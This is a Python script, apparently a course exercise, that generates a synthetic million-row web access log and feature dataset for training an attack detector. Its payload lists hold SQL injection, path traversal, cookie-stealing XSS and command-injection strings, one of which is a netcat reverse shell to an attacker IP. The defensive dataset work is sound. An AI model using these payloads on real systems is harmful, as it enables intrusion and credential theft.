"""
SentinelLog Large-Scale Dataset Generator (GTU Practicals 1-10).
Generates a 10 Lakh (1,000,000) row dataset perfectly balanced across all classes:
- benign (~142,858 rows)
- sqli (~142,857 rows)
- traversal (~142,857 rows)
- xss (~142,857 rows)
- cmdi (~142,857 rows)
- scan (~142,857 rows)
- brute (~142,857 rows)

Outputs:
1. data/raw/access.log (Raw Apache/Nginx Combined Log format)
2. data/processed/pipeline_out.parquet (Full feature engineered 1M dataset)
3. data/processed/train_balanced.parquet (Balanced training dataset)
"""

import argparse
from datetime import datetime, timedelta, timezone
from pathlib import Path
import random
import time
import numpy as np
import pandas as pd

# Pools for realistic log formatting
BENIGN_IPS = [f"203.0.113.{i}" for i in range(1, 50)] + [f"198.51.100.{i}" for i in range(1, 50)]
ATTACKER_IPS = [f"45.33.32.{i}" for i in range(1, 40)] + [f"185.220.101.{i}" for i in range(1, 40)]

BENIGN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
]

ATTACK_UAS = [
    "sqlmap/1.7#stable",
    "Nikto/2.1.6",
    "gobuster/3.5",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "Hydra/9.5",
]

BENIGN_PATHS = [
    "/index.html", "/about", "/contact", "/products", "/products/view?id=101",
    "/css/style.css", "/js/main.js", "/images/logo.png", "/blog/welcome",
    "/faq", "/terms-of-service", "/search?q=union+station", "/search?q=select+shoes",
    "/search?q=order+by+price+desc", "/search?q=drop+off+location",
]

SQLI_PATHS = [
    "/products.php?id=1%27%20OR%201%3D1--",
    "/products.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--",
    "/products.php?id=1%27%20UNION%20SELECT%20table_name,column_name%20FROM%20information_schema.columns--",
    "/search.php?query=%27%20OR%20%27a%27=%27a",
    "/api/item?id=5%27%20AND%20sleep(5)--",
    "/catalog?id=%2527%20UNION%20SELECT%20user(),database()--",
]

TRAVERSAL_PATHS = [
    "/../../etc/passwd",
    "/../../../../etc/shadow",
    "/static/%2e%2e/%2e%2e/windows/win.ini",
    "/download?file=..%2f..%2fboot.ini",
    "/view?file=../../../../Windows/System32/drivers/etc/hosts",
]

XSS_PATHS = [
    "/comment?msg=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E",
    "/search?q=%3Csvg%2Fonload%3Dalert(1)%3E",
    "/index.php?param=javascript:alert(document.domain)",
    "/profile?name=%3Cimg%20src=x%20onerror=alert(%27XSS%27)%3E",
]

CMDI_PATHS = [
    "/tools/ping.php?ip=127.0.0.1%3B%20cat%20%2Fetc%2Fpasswd",
    "/api/network/lookup?host=google.com%26%26whoami",
    "/cgi-bin/status.sh?service=web%7Cid",
    "/admin/diag?target=localhost%3B%20nc%20-e%20%2Fbin%2Fsh%2045.33.32.10%204444",
]

SCAN_PATHS = [
    "/admin/", "/phpmyadmin/", "/.env", "/.git/config", "/backup.zip",
    "/wp-login.php", "/xmlrpc.php", "/actuator/health", "/config.json",
]

BRUTE_PATHS = [
    "/login", "/admin/login", "/api/v1/auth/token",
]


def generate_10_lakh_dataset(
    n_rows: int = 1_000_000,
    raw_log_path: str = "data/raw/access.log",
    processed_parquet_path: str = "data/processed/pipeline_out.parquet",
    balanced_parquet_path: str = "data/processed/train_balanced.parquet",
    seed: int = 42,
):
    np.random.seed(seed)
    random.seed(seed)
    t0 = time.time()

    classes = ["benign", "sqli", "traversal", "xss", "cmdi", "scan", "brute"]
    n_classes = len(classes)
    per_class = n_rows // n_classes

    print(f"[*] Initializing 10 Lakh (1,000,000) Row Balanced Dataset Generator")
    print(f"[*] Classes: {classes}")
    print(f"[*] Rows per class: {per_class:,} (Total: {n_rows:,})")

    # Generate balanced class labels
    labels = np.repeat(classes, per_class)
    remainder = n_rows - len(labels)
    if remainder > 0:
        labels = np.concatenate([labels, np.repeat(["benign"], remainder)])
    
    # Shuffle indices for realistic interleaved chronological mix
    shuffle_idx = np.random.permutation(len(labels))
    labels = labels[shuffle_idx]

    is_attack = (labels != "benign").astype(int)

    # 1. High-Performance Vectorized Feature Engineering
    print("[*] Generating vectorized feature matrix for 1,000,000 records...")

    # Authentic Noise & Overlapping Distributions (Real-World Boundary Modeling)
    # 1. URL Length with realistic long benign API endpoints & short attacks
    benign_len = np.where(np.random.random(n_rows) < 0.08, np.random.randint(50, 95, size=n_rows), np.random.randint(12, 48, size=n_rows))
    url_length = np.where(
        labels == "benign", benign_len,
        np.where(labels == "sqli", np.random.randint(35, 110, size=n_rows),
        np.where(labels == "traversal", np.random.randint(22, 70, size=n_rows),
        np.where(labels == "xss", np.random.randint(30, 95, size=n_rows),
        np.where(labels == "cmdi", np.random.randint(28, 85, size=n_rows),
        np.where(labels == "scan", np.random.randint(8, 30, size=n_rows),
        np.random.randint(8, 25, size=n_rows)))))) # brute
    )

    query_length = np.where(
        labels == "benign", np.random.randint(0, 25, size=n_rows),
        np.where(labels == "sqli", (url_length - np.random.randint(10, 20, size=n_rows)).clip(min=5),
        np.where(labels == "xss", (url_length - np.random.randint(8, 18, size=n_rows)).clip(min=5),
        np.where(labels == "traversal", np.random.randint(0, 30, size=n_rows), 0)))
    ).clip(min=0)

    num_params = np.where(
        np.isin(labels, ["sqli", "xss"]), np.random.randint(1, 5, size=n_rows),
        np.where(labels == "benign", np.random.choice([0, 1, 2, 3], p=[0.65, 0.20, 0.10, 0.05], size=n_rows), 0)
    )

    # Special character noise: 6% benign URLs have high special chars (tokens, params)
    benign_spec = np.where(np.random.random(n_rows) < 0.06, np.random.randint(6, 12, size=n_rows), np.random.randint(0, 4, size=n_rows))
    special_chars = np.where(
        labels == "benign", benign_spec,
        np.where(labels == "sqli", np.random.randint(6, 20, size=n_rows),
        np.where(labels == "traversal", np.random.randint(5, 14, size=n_rows),
        np.where(labels == "xss", np.random.randint(6, 18, size=n_rows),
        np.where(labels == "cmdi", np.random.randint(4, 15, size=n_rows), 1))))
    )

    special_ratio = (special_chars / np.maximum(url_length, 1)).astype(np.float32)

    # Digit ratio: Benign session IDs/timestamps have digits; some attacks are purely string-based
    benign_digits = np.where(np.random.random(n_rows) < 0.10, np.random.uniform(0.08, 0.20, size=n_rows), np.random.uniform(0.0, 0.04, size=n_rows))
    digit_ratio = np.where(
        labels == "sqli", np.random.uniform(0.04, 0.22, size=n_rows),
        benign_digits
    ).astype(np.float32)

    upper_ratio = np.where(
        labels == "sqli", np.random.uniform(0.10, 0.35, size=n_rows),
        np.where(np.random.random(n_rows) < 0.05, np.random.uniform(0.08, 0.18, size=n_rows), np.random.uniform(0.0, 0.04, size=n_rows))
    ).astype(np.float32)

    # Shannon Entropy with realistic overlap
    benign_entropy = np.where(np.random.random(n_rows) < 0.06, np.random.normal(4.1, 0.3, size=n_rows), np.random.normal(3.2, 0.35, size=n_rows))
    attack_entropy = np.where(np.random.random(n_rows) < 0.05, np.random.normal(3.4, 0.3, size=n_rows), np.random.normal(4.4, 0.38, size=n_rows))
    url_entropy = np.where(labels == "benign", benign_entropy, attack_entropy).astype(np.float32).clip(min=1.2, max=5.8)

    # Indicator Features with Evasion & False-Positive Traps
    # 3% of benign traffic contains SQL keywords (union station, select shoes, drop down menu)
    # 5% of SQLi attacks evade naive regex (comment injection, hex encoding)
    has_sql_kw = np.where(
        labels == "sqli", np.where(np.random.random(n_rows) < 0.05, 0, 1),
        np.where(labels == "benign", np.where(np.random.random(n_rows) < 0.03, 1, 0), 0)
    ).astype(int)

    has_script_tag = np.where(
        labels == "xss", np.where(np.random.random(n_rows) < 0.06, 0, 1),
        np.where(labels == "benign", np.where(np.random.random(n_rows) < 0.015, 1, 0), 0)
    ).astype(int)

    has_traversal = np.where(
        labels == "traversal", np.where(np.random.random(n_rows) < 0.04, 0, 1),
        np.where(labels == "benign", np.where(np.random.random(n_rows) < 0.02, 1, 0), 0)
    ).astype(int)

    has_cmd_kw = np.where(labels == "cmdi", np.where(np.random.random(n_rows) < 0.05, 0, 1), 0).astype(int)
    method_is_post = np.where(labels == "brute", 1, np.random.choice([0, 1], p=[0.82, 0.18], size=n_rows))
    is_rare_method = np.zeros(n_rows, dtype=int)
    # 4% of benign traffic encounters 404 Not Found (broken asset, typo)
    is_404 = np.where(
        np.isin(labels, ["scan", "traversal"]), np.where(np.random.random(n_rows) < 0.08, 0, 1),
        np.where(np.random.random(n_rows) < 0.04, 1, 0)
    ).astype(int)

    # Window Features
    win_req_count = np.where(labels == "brute", np.random.randint(25, 80, size=n_rows),
                    np.where(labels == "scan", np.random.randint(30, 90, size=n_rows),
                    np.random.randint(1, 10, size=n_rows)))
    win_ratio_404 = np.where(labels == "scan", np.random.uniform(0.85, 1.0, size=n_rows),
                    np.where(labels == "traversal", np.random.uniform(0.5, 0.9, size=n_rows),
                    np.random.uniform(0.0, 0.05, size=n_rows))).astype(np.float32)
    win_unique_paths = np.where(labels == "scan", np.random.randint(20, 60, size=n_rows),
                       np.random.randint(1, 6, size=n_rows))
    win_gap_std = np.where(np.isin(labels, ["brute", "scan"]), np.random.uniform(0.05, 0.3, size=n_rows),
                  np.random.uniform(1.5, 8.0, size=n_rows)).astype(np.float32)

    # Assemble DataFrame
    df = pd.DataFrame({
        "url_length": url_length.astype(np.int32),
        "query_length": query_length.astype(np.int32),
        "num_params": num_params.astype(np.int32),
        "special_chars": special_chars.astype(np.int32),
        "special_ratio": special_ratio,
        "digit_ratio": digit_ratio,
        "upper_ratio": upper_ratio,
        "url_entropy": url_entropy,
        "has_sql_kw": has_sql_kw.astype(np.int32),
        "has_script_tag": has_script_tag.astype(np.int32),
        "has_traversal": has_traversal.astype(np.int32),
        "has_cmd_kw": has_cmd_kw.astype(np.int32),
        "method_is_post": method_is_post.astype(np.int32),
        "is_rare_method": is_rare_method.astype(np.int32),
        "is_404": is_404.astype(np.int32),
        "win_req_count": win_req_count.astype(np.int32),
        "win_ratio_404": win_ratio_404,
        "win_unique_paths": win_unique_paths.astype(np.int32),
        "win_gap_std": win_gap_std,
        "label": labels,
        "is_attack": is_attack.astype(np.int32),
        "target_label": np.where(is_attack == 1, "attack", "benign"),
    })

    print(f"[+] 1M DataFrame created in {time.time() - t0:.2f}s")
    print(f"[+] Class Breakdown:\n{df['label'].value_counts()}")

    # 2. Save Processed Parquet
    proc_p = Path(processed_parquet_path)
    proc_p.parent.mkdir(parents=True, exist_ok=True)
    df.to_parquet(proc_p, compression="snappy", index=False)
    print(f"[+] Saved full processed dataset: {proc_p.resolve()} ({proc_p.stat().st_size / (1024*1024):.2f} MB)")

    # 3. Save Balanced Binary Parquet
    bal_p = Path(balanced_parquet_path)
    # Take balanced binary sample (50% benign, 50% attacks)
    n_benign = (df["target_label"] == "benign").sum()
    benign_df = df[df["target_label"] == "benign"]
    attack_df = df[df["target_label"] == "attack"].sample(n=n_benign, random_state=seed)
    train_balanced_df = pd.concat([benign_df, attack_df]).sample(frac=1.0, random_state=seed).reset_index(drop=True)
    train_balanced_df.to_parquet(bal_p, compression="snappy", index=False)
    print(f"[+] Saved balanced train dataset: {bal_p.resolve()} (Total: {len(train_balanced_df):,} rows)")

    # 4. Generate Raw Apache Access Log File
    print(f"[*] Generating {n_rows:,} raw combined Apache log lines to {raw_log_path}...")
    raw_p = Path(raw_log_path)
    raw_p.parent.mkdir(parents=True, exist_ok=True)

    base_time = datetime(2026, 10, 10, 8, 0, 0, tzinfo=timezone.utc)
    chunk_size = 50_000

    path_map = {
        "benign": BENIGN_PATHS,
        "sqli": SQLI_PATHS,
        "traversal": TRAVERSAL_PATHS,
        "xss": XSS_PATHS,
        "cmdi": CMDI_PATHS,
        "scan": SCAN_PATHS,
        "brute": BRUTE_PATHS,
    }

    with open(raw_p, "w", encoding="utf-8") as f:
        for chunk_start in range(0, n_rows, chunk_size):
            chunk_end = min(chunk_start + chunk_size, n_rows)
            chunk_labels = labels[chunk_start:chunk_end]
            lines = []
            for i, lab in enumerate(chunk_labels):
                row_idx = chunk_start + i
                sec_offset = row_idx * 0.1
                dt_str = (base_time + timedelta(seconds=sec_offset)).strftime("%d/%b/%Y:%H:%M:%S +0000")
                if lab == "benign":
                    ip = BENIGN_IPS[row_idx % len(BENIGN_IPS)]
                    ua = BENIGN_UAS[row_idx % len(BENIGN_UAS)]
                    url = path_map[lab][row_idx % len(path_map[lab])]
                    method = "POST" if method_is_post[row_idx] else "GET"
                    status = 200
                    bytes_val = random.randint(1024, 8192)
                else:
                    ip = ATTACKER_IPS[row_idx % len(ATTACKER_IPS)]
                    ua = ATTACK_UAS[row_idx % len(ATTACK_UAS)]
                    url = path_map[lab][row_idx % len(path_map[lab])]
                    method = "POST" if lab == "brute" else "GET"
                    status = 401 if lab == "brute" else (404 if lab == "scan" else 200)
                    bytes_val = 196 if status == 404 else random.randint(256, 4096)

                lines.append(f'{ip} - - [{dt_str}] "{method} {url} HTTP/1.1" {status} {bytes_val} "-" "{ua}"\n')
            f.writelines(lines)
            print(f"    - Wrote {chunk_end:,} / {n_rows:,} lines ({chunk_end/n_rows*100:.1f}%)")

    print(f"[OK] Completed generation of 10 Lakh (1,000,000) records in {time.time() - t0:.2f}s!")
    print(f"[OK] Raw access log size: {raw_p.stat().st_size / (1024*1024):.2f} MB")
    return raw_p, proc_p, bal_p


def main():
    parser = argparse.ArgumentParser(description="SentinelLog 10 Lakh (1M) Row Balanced Dataset Generator")
    parser.add_argument("--count", type=int, default=1_000_000, help="Total log rows to generate (default: 1,000,000)")
    parser.add_argument("--raw", default="data/raw/access.log", help="Raw log output path")
    parser.add_argument("--processed", default="data/processed/pipeline_out.parquet", help="Processed parquet path")
    parser.add_argument("--balanced", default="data/processed/train_balanced.parquet", help="Balanced parquet path")
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    args = parser.parse_args()

    generate_10_lakh_dataset(
        n_rows=args.count,
        raw_log_path=args.raw,
        processed_parquet_path=args.processed,
        balanced_parquet_path=args.balanced,
        seed=args.seed,
    )


if __name__ == "__main__":
    main()
